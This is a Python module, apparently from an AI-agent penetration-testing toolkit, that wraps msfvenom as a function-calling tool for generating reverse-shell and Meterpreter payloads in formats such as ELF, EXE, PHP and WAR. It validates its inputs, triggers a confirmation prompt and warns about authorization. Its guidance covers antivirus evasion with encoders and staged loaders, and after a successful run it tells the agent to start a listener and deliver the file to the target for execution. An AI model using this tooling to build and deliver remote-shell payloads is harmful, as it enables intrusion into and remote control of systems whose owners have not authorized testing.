"""msfvenom 深度定制：payload 生成（危险操作，触发确认）。"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from .base import ToolProfile, check_installed

# 常用 payload 白名单（防止任意命令注入/恶意参数）
PAYLOADS = (
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x64/shell/reverse_tcp",
    "linux/x86/shell_reverse_tcp",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "windows/x64/shell_reverse_tcp",
    "windows/shell_reverse_tcp",
    "java/jsp_shell_reverse_tcp",
    "php/meterpreter_reverse_tcp",
    "python/meterpreter_reverse_tcp",
)

FORMATS = ("elf", "elfso", "exe", "exe-service", "raw", "py", "php", "jsp", "war", "c", "ps1")

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "payload_gen",
            "description": (
                "用 msfvenom 生成反弹 shell payload（后渗透/利用阶段）。"
                "⚠ 危险操作：会触发确认弹窗；只允许对你有权测试的目标使用。"
                "生成后建议用 msf_run 起 multi/handler 监听。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "payload": {
                        "type": "string",
                        "enum": list(PAYLOADS),
                        "description": "payload 类型（按目标系统架构选择）",
                    },
                    "lhost": {
                        "type": "string",
                        "description": "反弹连接的回连地址（你的 IP）",
                    },
                    "lport": {"type": "integer", "description": "回连端口（1-65535）"},
                    "format": {
                        "type": "string",
                        "enum": list(FORMATS),
                        "description": "输出格式（默认 elf）",
                    },
                    "outfile": {
                        "type": "string",
                        "description": "输出路径（默认 /tmp/payload.<格式>）",
                    },
                    "encoder": {
                        "type": "string",
                        "description": "编码器（可选，如 x64/xor_dynamic 或 x86/shikata_ga_nai）",
                    },
                    "arch": {
                        "type": "string",
                        "description": "架构（可选，默认由 payload 决定）",
                    },
                    "platform": {
                        "type": "string",
                        "description": "平台（可选，如 linux/windows）",
                    },
                },
                "required": ["payload", "lhost", "lport"],
            },
        },
    },
]

_ENCODER_RE = re.compile(r"^[a-z0-9_/]{1,64}$")
_ARCH_RE = re.compile(r"^[a-z0-9_]{1,32}$")
_PLATFORM_RE = re.compile(r"^[a-z0-9_]{1,32}$")


def _check_outfile(v: str | None, fmt: str) -> str:
    if not v:
        return f"/tmp/payload.{fmt}"
    p = v.strip()
    if re.search(r"[;&|`$\\\s]", p):
        raise ValueError(f"outfile 含非法字符: {p!r}")
    if not p.startswith(("/tmp/", "/root/", "./")):
        raise ValueError("outfile 仅允许 /tmp/、/root/ 或当前目录")
    return p


def _build_cmd(args: dict[str, Any]) -> tuple[str, int]:
    payload = str(args.get("payload") or "")
    if payload not in PAYLOADS:
        raise ValueError(f"payload 仅支持白名单: {', '.join(PAYLOADS[:6])} …")
    lhost = str(args.get("lhost") or "").strip()
    if not re.fullmatch(r"[\w.:-]{1,255}", lhost) or re.search(r"[;&|`$\\\s]", lhost):
        raise ValueError(f"lhost 格式非法: {lhost!r}")
    try:
        lport = int(args.get("lport"))
        if not 1 <= lport <= 65535:
            raise ValueError
    except (TypeError, ValueError):
        raise ValueError(f"lport 必须在 1-65535: {args.get('lport')!r}")
    fmt = str(args.get("format") or "elf").strip().lower()
    if fmt not in FORMATS:
        raise ValueError(f"format 仅支持: {', '.join(FORMATS)}")
    outfile = _check_outfile(str(args.get("outfile") or ""), fmt)
    encoder = str(args.get("encoder") or "").strip()
    if encoder and not _ENCODER_RE.match(encoder):
        raise ValueError(f"encoder 格式非法: {encoder!r}")
    arch = str(args.get("arch") or "").strip()
    if arch and not _ARCH_RE.match(arch):
        raise ValueError(f"arch 格式非法: {arch!r}")
    platform = str(args.get("platform") or "").strip()
    if platform and not _PLATFORM_RE.match(platform):
        raise ValueError(f"platform 格式非法: {platform!r}")

    parts = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]
    if arch:
        parts += ["-a", arch]
    if platform:
        parts += ["--platform", platform]
    if encoder:
        parts += ["-e", encoder]
    parts += ["-f", fmt, "-o", outfile]
    return " ".join(parts), 120


class MsfvenomProfile(ToolProfile):
    name = "msfvenom"
    aliases = ["payload 生成", "生成木马", "msfvenom", "反弹 shell 生成", "反弹 shell", "payload"]
    summary = "payload 生成器"
    lore = """### msfvenom 深度使用要点
- 选型：目标 Linux x64 → linux/x64/meterpreter/reverse_tcp；Windows → windows/x64/meterpreter/reverse_tcp；
  Web 环境 → php/python/java payload；生成后格式对应 -f（elf/exe/py/php/jsp/war）。
- 反弹地址 LHOST 必须是目标能连回你的地址（内网 IP 或隧道地址），LPORT 与监听端口一致。
- 免杀思路（仅授权测试）：编码器（-e shikata_ga_nai）、分离加载（-p windows/x64/meterpreter/reverse_tcp + -f raw + 加载器）。
- 生成后用 msf_run 起 exploit/multi/handler（options: PAYLOAD/LHOST/LPORT）接收回连。
- 注意 payload 会被安全层拦截确认——只生成、不实际投递到未授权目标。"""
    extra_schemas = SCHEMAS

    async def exec_payload_gen(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("msfvenom"):
            return "msfvenom 未安装（apt install metasploit-framework）。"
        cmd, timeout = _build_cmd(args)
        raw = await self._run(ex, cmd, timeout=timeout)
        import re as _re

        size = _re.search(r"(\d+) bytes", raw)
        outfile = _check_outfile(str(args.get("outfile") or ""), str(args.get("format") or "elf"))
        if "Error" in raw or "error" in raw:
            head = [f"生成失败: {raw.strip()[:300]}"]
        else:
            head = [f"✅ payload 已生成: {outfile}" + (f"（{size.group(1)} bytes）" if size else "")]
            head.append("下一步：msf_run 起 multi/handler（PAYLOAD/LHOST/LPORT 保持一致），再把文件投递到目标执行。")
        return self._summary(raw, head, tail=30)
